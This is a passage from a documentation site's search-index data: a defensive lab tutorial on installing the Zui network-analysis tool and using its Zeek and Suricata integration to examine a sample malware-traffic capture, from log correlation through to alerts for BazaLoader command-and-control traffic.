PCAP files, automatically run analyses, and explore logs generated by these tools. Additionally, Zui provides visualisation features to help users better understand complex network behaviors and security incidents.</p>"},{"location":"zui/zui.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Zui and Wireshark were installed on an Ubuntu virtual machine (VM). Malware traffic analysis was conducted using Zui and Wireshark in a safe and controlled environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) Suricata Ubuntu 22.04 LTS Zui and Wireshark 10.0.0.27 <p></p>"},{"location":"zui/zui.html#install-zui-desktop-application","title":"Install Zui Desktop Application","text":"<p>Download the installer at the\u00a0Zui download\u00a0page, as appropriate for your Linux distribution.</p> <p>Install Zui by running:</p> <pre><code>sudo dpkg -i zui_1.17.0_amd64.deb\n</code></pre> <p>Run zui by typing <code>zui</code> or clicking zui icon in the applications.</p> <p>Brimcap is a command line utility for converting\u00a0pcaps\u00a0into the flexible, searchable\u00a0Zed data formats. Brimcap is bundles with Zui Desktop Application. By default Brimcap uses both Zeek and Suricata for analysis. </p>"},{"location":"zui/zui.html#malware-traffic-analysis","title":"Malware Traffic Analysis","text":"<p>Download a sample PCAP file from https://www.malware-traffic-analysis.net/</p> <p>(e.g. https://www.malware-traffic-analysis.net/2021/06/03/index.html)</p> <p>Unzip the archive with the password <code>infectedYYYYMMDD</code></p> <p>On Zui, click <code>import data</code> and select the downloaded PCAP.</p> <p>Alternatively you can drag and drop the PCAP into Zui. </p> <p></p> <p>Once the PCAP is loaded, click <code>Query Pool</code> icon.</p> <p></p> <p>As shown below different coloured tiles are present. Different categories of Zeek events are visible in the <code>_path</code> field while the Suricata events are visible in the <code>event_type</code> field with the values <code>alerts</code> </p> <p></p> <p>By clicking on the Toggle Right Side Bar icon and Details, we can view more details on individual logs on the detail pane. Zeek generates a valued called unique identifier <code>uid</code> . <code>uid</code> is shared between the underlying connection record <code>conn.log</code> and the records that summarise the application layer transactions that occurred over that connection. By automatically joining the data by this <code>uid</code> field, Zui presents a correlation view that shows all the events with a single connection.</p> <p></p> <p></p> <p>The tiles can be clicked to jump directly to the related records in the details pane. </p> <p>The Zeek connection record also contains a community ID value that is joined with the community ID value of any Suricata alerts that were generated from the same connection. That is why the associated alerts are shown in the correlation view.</p> <p></p> <p>Zeek file records include hashes that were calculated based on the observed file payloads. When a file record is clicked, the detail pane includes tables that use these hashes to summarise whether this same file payload has appeared in the captured data, potentially under different names or transmitted from multiple hosts. </p> <p></p> <p>Filter on <code>filename!=null</code> to view file records</p> <p></p> <p>The hash value can be lookup in the VirusTotal and it confirms that this is a malicious DLL.</p> <p></p> <p></p> <p>Another handy feature in Zui is extracting individual flows. At the same time our pcap was being analysed by Zeek and Suricata, an index of its contents was also being generated. Whenever we click on a particular Zeek record, Zui uses the same correlation logic we saw earlier in the detail panel to determine the timestamp and duration of the underlying flow. When we click on the Download Packets button, packet index is used to extract just that flow from the original pcap file. This can be a great timesaver instead of opening a large pcap file on Wireshark. </p> <p></p> <p></p> <p>Right-click on one of the alerts and click <code>Filter == value</code> to focus on the alerts. By default, the Suricata software that ships with Zui applies the\u00a0Emerging Threats Open\u00a0rule set when generating alert events from imported pcap data. This rule set is updated each time Zui is launched and connected to the Internet.</p> <p></p> <p></p> <p>If you scroll across, you can see the alert for <code>BazaLoader CnC</code> and <code>Bazr Backdoor</code> have been triggered.</p> <p></p> <p>Click on each alert to examine more details. You will be able to find <code>community id</code> which you can use to correlate with Zeek and Suricata logs.</p> <p></p> <p>Filter on the <code>community id</code> by right-clicking it and selecting <code>Filter == value</code></p> <p>Delete <code>event type</code> on the search bar to focus on <code>community id</code></p> <p></p>"},{"location":"zui/zui.html#references","title":"References","text":"<ul> <li>https://youtu.be/eMzljqxASVA?si=ph2fV-LK7amul5SH</li> <li>https://youtu.be/bba9l4Ianbs?si=VzSKPUHI23ohdmdZ</li> </ul>"}]}